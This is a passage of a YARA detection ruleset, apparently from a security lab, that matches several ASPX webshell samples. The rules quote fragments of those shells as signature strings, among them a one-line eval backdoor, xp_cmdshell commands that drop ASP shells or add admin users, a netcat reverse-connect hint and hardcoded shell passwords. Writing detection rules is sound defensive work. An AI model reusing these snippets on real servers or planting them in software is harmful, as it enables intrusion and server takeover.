        $x5 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\'><font color=\"#009900\">All Users</font></a> </td>" fullword ascii
        $s6 = "MyProcessStartInfo.UseShellExecute = false;" fullword ascii
        $s7 = "<asp:TextBox ID=\"TextBoxNewfile\" runat=\"server\" Width=\"477px\" ForeColor=\"#009900\" >c:\\char.txt</asp:TextBox>" fullword ascii
        $s8 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\config\\'><font color=\"#009900\">Config</font></a> </td>" fullword ascii
        $s9 = ":<asp:TextBox ID=\"TextBoxDfile\" runat=\"server\" Width=\"270px\">c:\\logo.gif</asp:TextBox>" fullword ascii
        $s10 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\inetsrv\\data\\'><font color=\"#009900\">Data</font></a> </td>" fullword ascii
        $s11 = "<asp:Label ID=\"LbSqlD\" runat=\"server\" Text=\"Command:\" Width=\"42px\"></asp:Label>" fullword ascii
        $s12 = "<td><a href='?page=index&src=C:\\Program Files\\RhinoSoft.com\\'><font color=\"#009900\">Serv-u" fullword ascii
        $s13 = "MyProcessStartInfo.Arguments = \"/c\" + TextBoxDos.Text;" fullword ascii
        $s14 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\" fullword ascii
        $s15 = "Response.Write(\"<a href='?page=index&src=\" + Server.MapPath(\".\") + \"\\\\'><font color='#009900'>Webshell" fullword ascii
        $s16 = "<td><asp:TextBox ID=\"pass\" runat=\"server\" TextMode=\"Password\" ForeColor = \"#009900\"></asp:TextBox></td>" fullword ascii
        $s17 = "<td><a href='?page=index&src=C:\\windows\\Temp\\'><font color=\"#009900\">Temp</font></a> </td>" fullword ascii
        $s18 = "<asp:Label ID=\"LbSqlA\" runat=\"server\" Text=\"Sql Host:\"></asp:Label>" fullword ascii
        $s19 = "gif89a<%@ Page Language=\"C#\" ContentType=\"text/html\" validateRequest=\"false\" aspcompat=\"true\"%>" fullword ascii
        $s20 = "ListBoxPro.Items.Add(allprocess.ProcessName);" fullword ascii
    condition:
        ( uint16(0) == 0x6967 and filesize < 80KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule d6956bc3e4cae2860e0b526bfc901e487a8de4ce
{
    meta:
        description = "aspx - file d6956bc3e4cae2860e0b526bfc901e487a8de4ce.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "fca2eae39f4009790408335b71d773b02890a08b581c6ff6bb32def585020abf"
    strings:
        $x1 = "string select = \"<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select onchange=" ascii
        $x2 = "<asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword ascii
        $x3 = "AMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\\\\1.asp';\\\">SP_oamethod exec<option value=" ascii
        $x4 = "Copyright (C) 2008 Bin -> <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WwW.RoOTkIt.NeT.Cn</a></asp:Panel><asp" fullword ascii
        $x5 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $x6 = "CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System32\\Cmd.ex" fullword ascii
        $s7 = "string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:" ascii
        $s8 = "iisinfo += \"<TD><a href=javascript:Command('change','\" + formatpath(newdir1.Properties[\"Path\"].Value.ToStrin" fullword ascii
        $s9 = "Bin_Filelist += \"<i><b><a href=javascript:Command('change','\" + parstr + \"');>|Parent Directory|</a></b></i>\";" fullword ascii
        $s10 = "tmpstr += \"<td><a href=javascript:Command('change','\" + foldername + \"')>\" + Bin_folder.Name + \"</a></td><td><b>" fullword ascii
        $s11 = "file += \"<a href=javascript:Command('change','\" + formatpath(drivers[i]) + \"');>\" + drivers[i] + \"</a>&nbsp;\";" fullword ascii
        $s12 = "<asp:Button ID=\"Bin_SAexecButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SAexecButton_Click\" /><br />" fullword ascii
        $s13 = "and('showatt','\" + filename + \"');>Att</a>|<a href=javascript:Command('del','\" + filename + \"');>Del</a></td>\";" fullword ascii
        $s14 = "<asp:Label ID=\"Bin_ErrorLabel\" runat=\"server\" EnableViewState=\"False\">Copyright (C) 2008 Bin -> <a href=\"http://www." fullword ascii
        $s15 = "kewebtask @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))\" + \"%\" + \">''' " ascii
        $s16 = "<asp:Button ID=\"Bin_SACMDButton\" runat=\"server\" Text=\"SA_Exec\" OnClick=\"Bin_SACMDButton_Click\" />" fullword ascii
        $s17 = "<asp:Button ID=\"Bin_LogshellButton\" runat=\"server\" Text=\"Bak_LOG\" OnClick=\"Bin_LogshellButton_Click\" /><hr /></a" fullword ascii
        $s18 = "Bin_SQLconnTextBox.Text = @\"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\\wwwroot\\database.mdb\";" fullword ascii
        $s19 = "<asp:Button ID=\"Bin_ExecButton\" runat=\"server\" OnClick=\"Bin_ExecButton_Click\" Text=\"Exec\" />" fullword ascii
        $s20 = "Copyright (C) 2008 Bin -> <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WwW.RoOTkIt.NeT.Cn</a></asp:Panel><asp:Panel I" ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b33086d2702fe6266783cd92638408d012966f31
{
    meta:
        description = "aspx - file b33086d2702fe6266783cd92638408d012966f31.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a7da83250466100782ccb95ef8e2b4c5832df8811e99b8e332594a869391dfa6"
    strings:
        $x1 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"Bin_List_Exec\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"Bin_List_Select" ascii
        $x2 = "OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\\bin.asp';\">SP_oamethod exec</asp:ListItem><asp:" ascii
        $x3 = "ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')\">SandBox</asp:ListItem><asp:ListItem Value=\"create tabl" ascii
        $x4 = "Bin_ExecSql(\"EXEC master..xp_cmdshell 'echo \" + substrfrm + \" >> c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x5 = "ePath.Value + \"\\\" -T -f c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x6 = "\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $x7 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_SaveP" ascii
        $x8 = "t:16px\" size=\"40\" value=\"c:\\windows\\system32\\sethc.exe\"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat=\"server\" " fullword ascii
        $x9 = "Bin_ExecSql(\"exec master..xp_cmdshell'bcp \\\"select safile from \" + db + \"..bin_temp\\\" queryout \\\"\" + Bin_TextBox_Sav" fullword ascii
        $x10 = "Bin_ExecSql(\"EXECUTE master..xp_cmdshell 'del c:\\\\windows\\\\temp\\\\tmp.fmt'\");" fullword ascii
        $x11 = "Response.AddHeader(\"Content-Disposition\",\"attachment;filename=\"+HttpUtility.UrlEncode(fi.Name,System.Text.Encoding.UTF8));" fullword ascii
        $x12 = "<asp:LinkButton ID=\"Bin_Button_Logout\" runat=\"server\" OnClick=\"Bin_Button_Logout_Click\" Text=\"Logout\" ></asp:LinkButton>" ascii
        $x13 = "foreach(ManagementObject p in Bin_WmiQuery(\"root\\\\CIMV2\",\"Select * from Win32_Process Where ProcessID ='\"+pid+\"'\"))" fullword ascii
        $x14 = "if(Bin_ExecSql(\"exec master..xp_makecab '\" + tmppath + \"\\\\~098611.tmp','default',1,'\" + Bin_TextBox_Source.Value + \"" fullword ascii
        $x15 = "return string.Format(\"<a href=\\\"javascript:Bin_PostBack('zcg_KillProcess','{0}')\\\">Kill</a>\",pid);" fullword ascii
        $s16 = "tc.Text=\"<a href=\\\"javascript:Bin_PostBack('zcg_ClosePM','\"+Bin_ToBase64(de.Key.ToString())+\"')\\\">Close</a>\";" fullword ascii
        $s17 = "<td style=\"width:20%\" align=\"left\">Target : <input id=\"Bin_TextBox_Target\" class=\"input\" runat=\"server\" type=\"text\" " ascii
        $s18 = "Bin_ExecSql(\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\");" fullword ascii
        $s19 = "Bin_ExecSql(\"If object_id('bin_temp')is not null drop table bin_temp\");" fullword ascii
        $s20 = ".GetFileName(Bin_TextBox_Target.Value) + \"'\")){Bin_Msg(\"File Copyed,Good Luck!\");}" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_175752ec67bdce90bcd083edbb5a21b61887b869
{
    meta:
        description = "aspx - file 175752ec67bdce90bcd083edbb5a21b61887b869.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "814044d84f4fa7b29b1459a8caed4fd0fa5d3d75a623078881faba33e968534a"
    strings:
        $x1 = "Private Declare Auto Function SHGetFileInfo Lib \"shell32.dll\" ( _" fullword ascii
        $s2 = "Dim shell_fake_name As String = \"Server Logging System\"" fullword ascii
        $s3 = "Function xrunexploit(ByVal fpath As String, ByVal base64 As String, ByVal port As String, ByVal ip As String) As Boolean" fullword ascii
        $s4 = "Dim ir As System.Security.Principal.IdentityReference = ds.GetOwner(GetType(System.Security.Principal.NTAccount)" fullword ascii
        $s5 = "Dim ir As System.Security.Principal.IdentityReference = ds.GetOwner(GetType(System.Security.Principal.NTAccount))" fullword ascii
        $s6 = "\"<td><span id=\"\"backC_\"\" class=\"\"msgcon\"\">example: (using netcat) run &quot;nc -l -p \" & bportC & \"&quot; and then p" fullword ascii
        $s7 = "headertop.InnerHtml = \"<a href=\"\"?\"\">\" & shell_title & \"</a>\"" fullword ascii
        $s8 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
        $s9 = "xnewfolder.InnerHtml = \"<form method=\"\"get\"\" action=\"\"?\"\" style=\"\"display:inline;margin:0;padding:0;\"\">\" & _" fullword ascii
        $s10 = "xnewfile.InnerHtml = \"<form action=\"\"?\"\" method=\"\"get\"\" style=\"\"display:inline;margin:0;padding:0;\"\">\" & _" fullword ascii
        $s11 = "xnewconnect.InnerHtml = \"<form method=\"\"get\"\" action=\"\"?\"\" style=\"\"display:inline;margin:0;padding:0;\"\">\" & _" fullword ascii
        $s12 = "xnewchild.InnerHtml = \"<form method=\"\"get\"\" action=\"\"?\"\" style=\"\"display:inline;margin:0;padding:0;\"\">\" & _" fullword ascii
        $s13 = "Response.AddHeader(\"Content-Disposition\", \"attachment;filename=\" & fname & \"\")" fullword ascii
        $s14 = "\"<input style=\"\"width:300px;\"\" type=\"\"text\"\" name=\"\"childname\"\" value=\"\"\" & shell_name & \".aspx\"\"; />\" & _" fullword ascii
        $s15 = "Response.AddHeader(\"Content-transfer-encoding\", \"binary\")" fullword ascii
        $s16 = "<td style=\"width:88%;\"><input type=\"text\" id=\"cmd\" name=\"cmd\" value=\"\" style=\"width:100%;\" runat=\"server\" /></td>" fullword ascii
        $s17 = "\"<div style=\"\"font-size:10px;\"\">\" & shell_fake_name & \"</div>\" & _" fullword ascii
        $s18 = "Dim shell_password As String = \"alpha\"" fullword ascii
        $s19 = "Dim wBind As String = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" & _" fullword ascii
        $s20 = "html_head = \"<title>\" & html_title & \"</title>\" & shell_style" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9941bef59e9d17e337ac18f1b4cfc9a99dab445e
{
    meta:
        description = "aspx - file 9941bef59e9d17e337ac18f1b4cfc9a99dab445e.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5bf7f8e8b37b9377b542916b690e7c700cc2035485a6c09cfefc682e951606d3"
    strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & cmd_to_execute & \" > \" & tempFile, 0, True)" fullword ascii
        $x2 = "errReturn = WinExec(Target_copy_of_cmd + \" /c \" + command + \"  > \" + tempFile , 10)" fullword ascii
        $x3 = "objProcessInfo = winObj.ExecQuery(\"Select \"+Fields_to_Show+\" from \" + Wmi_Function)" fullword ascii
        $x4 = "<p> Execute command with ASP.NET account using W32(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>" fullword ascii
        $x5 = "<p> Execute command with ASP.NET account using WSH(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>" fullword ascii
        $x6 = "<p> Execute command with ASP.NET account(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>" fullword ascii
        $x7 = "'local_copy_of_cmd= \"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\"" fullword ascii
        $x8 = "Sub ExecuteCommand1(command As String, tempFile As String,cmdfile As String)" fullword ascii
        $x9 = "Dim kProcessStartInfo As New ProcessStartInfo(\"cmd.exe\")" fullword ascii
        $x10 = "<p> Execute command with SQLServer account(<span class=\"style3\">Notice: only click \"Run\" to run</span>)</p>" fullword ascii
        $x11 = "Declare Function WinExec Lib \"kernel32\" Alias \"WinExec\" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long" fullword ascii
        $x12 = "Target_copy_of_cmd = Environment.GetEnvironmentVariable(\"Temp\")+\"\\kiss.exe\"" fullword ascii
        $x13 = "<td><a href=\"?action=user\" >List User Accounts</a> - <a href=\"?action=auser\" >IIS Anonymous User</a>- <a href=\"?action=scan" ascii
        $x14 = "Function ExecuteCommand2(cmd_to_execute, tempFile)" fullword ascii
        $s15 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
        $s16 = "ExecuteCommand1(command,tempFile,txtCmdFile.Text)" fullword ascii
        $s17 = "System.Web.Mail.SmtpMail.Send(request.ServerVariables(\"HTTP_HOST\"),\"test.mail.address.2008@gmail.com\",request.ServerVariable" ascii
        $s18 = "kProcessStartInfo.UseShellExecute = False" fullword ascii
        $s19 = "<asp:TextBox ID=\"txtCmdFile\" runat=\"server\" Width=\"473px\" style=\"border: 1px solid #084B8E\">C:\\\\WINDOWS\\\\system32" ascii
        $s20 = "Dim winObj, objProcessInfo, item, local_dir, local_copy_of_cmd, Target_copy_of_cmd" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule ad6fc2d150be1aea016371b3105a3093228a4380
{
    meta:
        description = "aspx - file ad6fc2d150be1aea016371b3105a3093228a4380.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5d45c0cc766ce85b4bbe3357cc1b9b6a5896eb23558003987f742342ef097457"
    strings:
        $s1 = "\"a\"+\"l\"+\"(\"+\"R\"+\"e\"+/*-/*-*/\"q\"+\"u\"+\"e\"/*-/*-*/+\"s\"+\"t\"+            " fullword ascii
        $s2 = "\"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]\"+            " fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_990e3f129b8ba409a819705276f8fa845b95dad0
{
    meta:
        description = "aspx - file 990e3f129b8ba409a819705276f8fa845b95dad0.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "77860468b9f3052693d8f743d1f1a5fcd92083385d93158b2789aa1b0880dc42"
    strings:
        $s1 = "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"z\"],\"unsafe\");%>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule f4c2499d2b1bebdef247555b0be1f264e887554d
{
    meta:
        description = "aspx - file f4c2499d2b1bebdef247555b0be1f264e887554d.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1e61d602421d29340b60c7fbb54262605314362ea8d3997cd19ffbd9d864df90"
    strings:
        $s1 = "temp = \"<form enctype=\\\"multipart/form-data\\\" action=\\\"?operation=upload\\\" method=\\\"post\\\">\";" fullword ascii
        $s2 = "using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.F" fullword ascii
        $s3 = "temp += \"<br>Auth Key: <input type=\\\"text\\\" name=\\\"authKey\\\"><br>\";" fullword ascii
        $s4 = "httpPostedFile.InputStream.Read(buffer, 0, fileLength);" fullword ascii
        $s5 = "int fileLength = httpPostedFile.ContentLength;" fullword ascii
        $s6 = "temp += \"<br>Please specify a file: <input type=\\\"file\\\" name=\\\"file\\\"></br>\";" fullword ascii
        $s7 = "using (FileStream fileStream = new FileStream(Path.Combine(fileInfo.DirectoryName, Path.GetFileName(httpPostedFile.FileName)), F" ascii
        $s8 = "Response.Write(this.GetUploadControls());" fullword ascii
        $s9 = "temp += \"<div><input type=\\\"submit\\\" value=\\\"Send\\\"></div>\";" fullword ascii
        $s10 = "HttpPostedFile httpPostedFile = Request.Files[0];" fullword ascii
        $s11 = "private const string AUTHKEY = \"woanware\";" fullword ascii
        $s12 = "private string GetUploadControls()" fullword ascii
        $s13 = "if (Request.Params[\"operation\"] == \"upload\")" fullword ascii
        $s14 = "private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,ta" ascii
        $s15 = "Response.Write(\"Unknown operation\");" fullword ascii
        $s16 = "if (Request.Params[\"authkey\"] == null)" fullword ascii
        $s17 = "private const string HEADER = \"<html>\\n<head>\\n<title>filesystembrowser</title>\\n<style type=\\\"text/css\\\"><!--\\nbody,ta" ascii
        $s18 = "if (Request.Params[\"authkey\"] != AUTHKEY)" fullword ascii
        $s19 = "string temp = string.Empty;" fullword ascii
        $s20 = "if (Request.Params[\"operation\"] != null)" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule ec91f7e8773b2e553acdb6cd197a28de0f204e29
{
    meta:
        description = "aspx - file ec91f7e8773b2e553acdb6cd197a28de0f204e29.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "790d10d4733a6a98d3b7de3b11641e2d3426ef4c0e443d7b07ca1eb156c8a457"
    strings:
        $s1 = "start<asp:TextBox ID=\"Fport_TextBox\" runat=\"server\" Text=\"c:\\\" Width=\"60px\"></asp:TextBox>&nbsp;&nbsp; " fullword ascii
        $s2 = "TimeSpan usetime = System.DateTime.Now - start;" fullword ascii
        $s3 = "<div>Code By <a href =\"http://www.hkmjj.com\">Www.hkmjj.Com</a></div>" fullword ascii
        $s4 = "System.DateTime start = DateTime.Now;" fullword ascii
        $s5 = "<asp:Button ID=\"Button\" runat=\"server\" OnClick=\"ClearAllThread_Click\" Text=\"ScanWriterable\" /><br />" fullword ascii
        $s6 = "Stopat <asp:TextBox ID=\"TextBox_stopat\" runat=\"server\" Text=\"5\" Width=\"60px\"></asp:TextBox>files" fullword ascii
        $s7 = "File.Create(cdir.FullName + \"\\\\test\").Close();" fullword ascii
        $s8 = "File.Delete(cdir.FullName + \"\\\\test\");" fullword ascii
        $s9 = "this.Lb_msg.Text +=\"usetime: \"+ usetime.TotalSeconds.ToString();" fullword ascii
        $s10 = "DirectoryInfo[] subdirs = cdir.GetDirectories();" fullword ascii
        $s11 = "<asp:Label ID=\"Lb_msg\" runat=\"server\" Text=\"\"></asp:Label>" fullword ascii
        $s12 = "ScanRights(new DirectoryInfo(Fport_TextBox.Text));" fullword ascii
        $s13 = "protected void ClearAllThread_Click(object sender, EventArgs e)" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule sig_8cca7bf3358cdfd9788d02306a0667d9efe07fc1
{
    meta:
        description = "aspx - file 8cca7bf3358cdfd9788d02306a0667d9efe07fc1.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
    strings:
        $x1 = "Copyright &copy; 2009 Bin -- <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">www.rootkit.net.cn</a>" fullword ascii
        $x2 = "href=\"http://www.rootkit.net.cn\" target=\"_blank\">Bin'Blog</a> All Rights Reserved.</div></div>" fullword ascii
        $s3 = "<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright &copy; 2006-2009 <" ascii
        $s4 = "Bin_Button_KillMe.Attributes[\"onClick\"]=\"if(confirm('Are you sure delete ASPXSPY?')){Bin_PostBack('hae','');};\";" fullword ascii
        $s5 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s6 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
        $s7 = "public string Password=\"21232f297a57a5a743894a0e4a801fc3\";//admin" fullword ascii
        $s8 = "an_Sname\" runat=\"server\" enableviewstate=\"true\"></span></td>" fullword ascii
        $s9 = "<title>ASPXspy</title>" fullword ascii
    condition:
        ( uint16(0) == 0xbbef and filesize < 200KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_3fc22d06033adc1f4e99a1de10b5c34351e198f8
{
    meta:
        description = "aspx - file 3fc22d06033adc1f4e99a1de10b5c34351e198f8.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "73c99b46c973b605d3a9d7b288ffc70c6a62cbf620ccd99b0c44876c77f8bd6e"
    strings:
        $x1 = "Private Declare Auto Function SHGetFileInfo Lib \"shell32.dll\" ( _" fullword ascii
        $s2 = "target.style.background = '\" & shell_color & \"';\" & _" fullword ascii
        $s3 = "Dim shell_password As String = \"devilzc0der\"" fullword ascii
        $s4 = "Dim shell_fake_name As String = \"Server Logging System\"" fullword ascii
        $s5 = "Function xrunexploit(ByVal fpath As String, ByVal base64 As String, ByVal port As String, ByVal ip As String) As Boolean" fullword ascii
        $s6 = "Dim ir As System.Security.Principal.IdentityReference = ds.GetOwner(GetType(System.Security.Principal.NTAccount)" fullword ascii
        $s7 = "Dim ir As System.Security.Principal.IdentityReference = ds.GetOwner(GetType(System.Security.Principal.NTAccount))" fullword ascii
        $s8 = "\"<td><span id=\"\"backC_\"\" class=\"\"msgcon\"\">example: (using netcat) run &quot;nc -l -p \" & bportC & \"&quot; and then p" fullword ascii
        $s9 = "headertop.InnerHtml = \"<a href=\"\"?\"\">\" & shell_title & \"</a>\"" fullword ascii
        $s10 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
        $s11 = "xnewfolder.InnerHtml = \"<form method=\"\"get\"\" action=\"\"?\"\" style=\"\"display:inline;margin:0;padding:0;\"\">\" & _" fullword ascii
        $s12 = "xnewfile.InnerHtml = \"<form action=\"\"?\"\" method=\"\"get\"\" style=\"\"display:inline;margin:0;padding:0;\"\">\" & _" fullword ascii
        $s13 = "xnewchild.InnerHtml = \"<form method=\"\"get\"\" action=\"\"?\"\" style=\"\"display:inline;margin:0;padding:0;\"\">\" & _" fullword ascii
        $s14 = "xnewconnect.InnerHtml = \"<form method=\"\"get\"\" action=\"\"?\"\" style=\"\"display:inline;margin:0;padding:0;\"\">\" & _" fullword ascii
        $s15 = "Response.AddHeader(\"Content-Disposition\", \"attachment;filename=\" & fname & \"\")" fullword ascii
        $s16 = "\"<input style=\"\"width:300px;\"\" type=\"\"text\"\" name=\"\"childname\"\" value=\"\"\" & shell_name & \".aspx\"\"; />\" & _" fullword ascii
        $s17 = "Response.AddHeader(\"Content-transfer-encoding\", \"binary\")" fullword ascii
        $s18 = "var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';" fullword ascii
        $s19 = "<td style=\"width:88%;\"><input type=\"text\" id=\"cmd\" name=\"cmd\" value=\"\" style=\"width:100%;\" runat=\"server\" /></td>" fullword ascii
        $s20 = "\"<div style=\"\"font-size:10px;\"\">\" & shell_fake_name & \"</div>\" & _" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule cc5fd0684c8e44f1fa3f8b7ebc12e21ec4bd5abb
{
    meta:
        description = "aspx - file cc5fd0684c8e44f1fa3f8b7ebc12e21ec4bd5abb.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a5de9d0c023673cd2335c4f82c5eaba9464672e834ab1505fe514afb5d6e4827"
    strings:
        $x1 = "<meta content=\"http://schemas.microsoft.com/intellisense/ie5\" name=\"vs_targetSchema\">" fullword ascii
        $s2 = "<meta content=\"Microsoft Visual Studio .NET 7.1\" name=\"GENERATOR\">" fullword ascii
        $s3 = "<asp:Label id=\"L4\" style=\"Z-INDEX: 107; LEFT: 144px; POSITION: absolute; TOP: 24px\" runat=\"server\"" fullword ascii
        $s4 = "<asp:Label id=\"L1\" style=\"Z-INDEX: 101; LEFT: 24px; POSITION: absolute; TOP: 96px\" runat=\"server\">" fullword ascii
        $s5 = "<asp:Button id=\"Button1\" style=\"Z-INDEX: 106; LEFT: 424px; POSITION: absolute; TOP: 504px\" runat=\"server\"" fullword ascii
        $s6 = "<asp:Label id=\"L2\" style=\"Z-INDEX: 103; LEFT: 24px; POSITION: absolute; TOP: 64px\" runat=\"server\">" fullword ascii
        $s7 = "<asp:Label id=\"L3\" style=\"Z-INDEX: 104; LEFT: 144px; POSITION: absolute; TOP: 96px\" runat=\"server\"" fullword ascii
        $s8 = "<asp:TextBox id=\"T1\" style=\"Z-INDEX: 102; LEFT: 144px; POSITION: absolute; TOP: 64px\" runat=\"server\"" fullword ascii
        $s9 = "<asp:TextBox id=\"T2\" style=\"Z-INDEX: 105; LEFT: 24px; POSITION: absolute; TOP: 128px\" runat=\"server\"" fullword ascii
        $s10 = "<meta content=\"JavaScript\" name=\"vs_defaultClientScript\">" fullword ascii
        $s11 = "System.IO.FileInfo fil = new System.IO.FileInfo(T1.Text);" fullword ascii
        $s12 = "<meta content=\"C#\" name=\"CODE_LANGUAGE\">" fullword ascii
        $s13 = "void Button1_Click(object sender, System.EventArgs e)" fullword ascii
        $s14 = "void Page_Load(object sender, System.EventArgs e)" fullword ascii
        $s15 = "System.IO.StreamWriter sw = fil.CreateText();" fullword ascii
        $s16 = "Width=\"504px\" Height=\"344px\" TextMode=\"MultiLine\"></asp:TextBox>" fullword ascii
        $s17 = "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" >" fullword ascii
    condition:
        ( uint16(0) == 0x6967 and filesize < 5KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_2683926d5cb91dd35070249d19db7fff84e9ead5
{
    meta:
        description = "aspx - file 2683926d5cb91dd35070249d19db7fff84e9ead5.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0d19a60d367de332a296a7070e86a0c537bad0ba2ff48af1768c6de84c086f71"
    strings:
        $s1 = "sqlDataReader = sqlCommand.ExecuteReader();" fullword ascii
        $s2 = "<tr><td><asp:Button ID=\"btnExecute\" runat=\"server\" OnClick=\"btnExecute_Click\" Text=\"Execute\" /></td>" fullword ascii
        $s3 = "sqlCommand.CommandType = CommandType.Text;" fullword ascii
        $s4 = "protected void btnExecute_Click(object sender, EventArgs e)" fullword ascii
        $s5 = "<tr><td><asp:TextBox ID=\"txtConnection\" runat=\"server\" Height=\"15px\" Width=\"100%\"></asp:TextBox></td>" fullword ascii
        $s6 = "sqlCommand = new SqlCommand(txtSql.Text, sqlConnection);" fullword ascii
        $s7 = "<%@ Import namespace=\"System.Data.SqlClient\"%>" fullword ascii
        $s8 = "<tr><td><asp:TextBox ID=\"txtSql\" runat=\"server\" Height=\"258px\" Width=\"100%\"></asp:TextBox></td>" fullword ascii
        $s9 = "<%@ Import namespace=\"System.Data\"%>" fullword ascii
        $s10 = "sqlConnection.ConnectionString = txtConnection.Text;" fullword ascii
        $s11 = "SqlCommand sqlCommand = null;" fullword ascii
        $s12 = "output.Append(sqlDataReader[index].ToString());" fullword ascii
